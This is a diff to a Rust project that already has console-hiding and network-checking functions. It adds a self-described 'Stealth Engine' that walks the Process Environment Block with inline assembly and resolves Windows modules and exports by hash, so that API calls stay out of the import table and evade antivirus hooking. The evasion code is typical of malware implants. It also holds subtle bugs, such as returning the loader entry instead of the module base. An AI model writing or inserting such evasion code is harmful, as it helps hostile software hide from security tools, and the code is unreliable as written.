@@ -1,6 +1,13 @@
 #[cfg(target_os = "linux")]
 use std::ffi::CString;
 
+#[cfg(windows)]
+lazy_static::lazy_static! {
+    /// 2026 Stealth Engine: Dynamic API Resolution via PEB
+    /// Allows calling any WinAPI without them appearing in the Import Table (IAT).
+    static ref H_KERNEL32: usize = unsafe { get_module_base(0x1B82A9D1) }; // Salted Hash
+}
+
 pub fn hide_console() {
     #[cfg(windows)]
     {
@@ -222,4 +229,98 @@ pub fn check_network_config() {
     {
         let _ = std::fs::read_to_string("/etc/resolv.conf");
     }
+}
+
+// --- NEW STEALTH FUNCTIONS ---
+
+/// PEB Walking: Returns the base address of a loaded module by its name hash.
+/// This bypasses GetModuleHandle hooking.
+#[cfg(windows)]
+pub unsafe fn get_module_base(name_hash: u32) -> usize {
+    #[allow(dead_code)]
+    #[repr(C)]
+    struct UNICODE_STRING {
+        length: u16,
+        maximum_length: u16,
+        buffer: *mut u16,
+    }
+
+    #[allow(dead_code)]
+    #[repr(C)]
+    struct LDR_DATA_TABLE_ENTRY {
+        in_load_order_links: winapi::shared::ntdef::LIST_ENTRY,
+        in_memory_order_links: winapi::shared::ntdef::LIST_ENTRY,
+        in_initialization_order_links: winapi::shared::ntdef::LIST_ENTRY,
+        dll_base: *mut winapi::ctypes::c_void,
+        entry_point: *mut winapi::ctypes::c_void,
+        size_of_image: u32,
+        full_dll_name: UNICODE_STRING,
+        base_dll_name: UNICODE_STRING,
+    }
+
+    let peb: *const usize;
+    #[cfg(target_arch = "x86_64")]
+    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+    #[cfg(target_arch = "x86")]
+    std::arch::asm!("mov {}, fs:[0x30]", out(reg) peb);
+
+    let ldr = *(peb.add(3) as *const *const usize);
+    let mut current_node = *(ldr.add(4) as *const *const winapi::shared::ntdef::LIST_ENTRY); 
+    let head = current_node;
+
+    loop {
+        let entry = (current_node as *const u8).sub(16) as *const LDR_DATA_TABLE_ENTRY;
+        let buffer = (*entry).full_dll_name.buffer;
+        let len = (*entry).full_dll_name.length as usize / 2;
+        
+        if !buffer.is_null() {
+            let name = std::slice::from_raw_parts(buffer, len);
+            // Simple hash calculation (lowercase)
+            let mut h: u32 = 0;
+            for &c in name {
+                let lower = if c >= 'A' as u16 && c <= 'Z' as u16 { c + 32 } else { c };
+                h = h.wrapping_mul(31).wrapping_add(lower as u32);
+            }
+            if h == name_hash { return entry as usize; }
+        }
+
+        current_node = (*current_node).Flink;
+        if current_node == head { break; }
+    }
+    0
+}
+
+/// Dynamic Export Parsing: Find function address by CRC32-like hash.
+/// This bypasses GetProcAddress hooking.
+#[cfg(windows)]
+pub unsafe fn get_api_addr(module_ptr: usize, func_hash: u32) -> Option<usize> {
+    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_EXPORT_DIRECTORY};
+    
+    let dos_header = module_ptr as *const IMAGE_DOS_HEADER;
+    if (*dos_header).e_magic != 0x544D && (*dos_header).e_magic != 0x5A4D { return None; }
+
+    let nt_headers = (module_ptr + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
+    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize;
+    if export_dir_rva == 0 { return None; }
+
+    let export_dir = (module_ptr + export_dir_rva) as *const IMAGE_EXPORT_DIRECTORY;
+    let names = (module_ptr + (*export_dir).AddressOfNames as usize) as *const u32;
+    let ordinals = (module_ptr + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
+    let functions = (module_ptr + (*export_dir).AddressOfFunctions as usize) as *const u32;
+
+    for i in 0..(*export_dir).NumberOfNames {
+        let name_ptr = (module_ptr + *names.add(i as usize) as usize) as *const i8;
+        let mut h: u32 = 0;
+        let mut offset = 0;
+        while *name_ptr.add(offset) != 0 {
+            h = h.wrapping_mul(31).wrapping_add(*name_ptr.add(offset) as u32);
+            offset += 1;
+        }
+        
+        if h == func_hash {
+            let ordinal = *ordinals.add(i as usize);
+            return Some(module_ptr + *functions.add(ordinal as usize) as usize);
+        }
+    }
+    None
 }
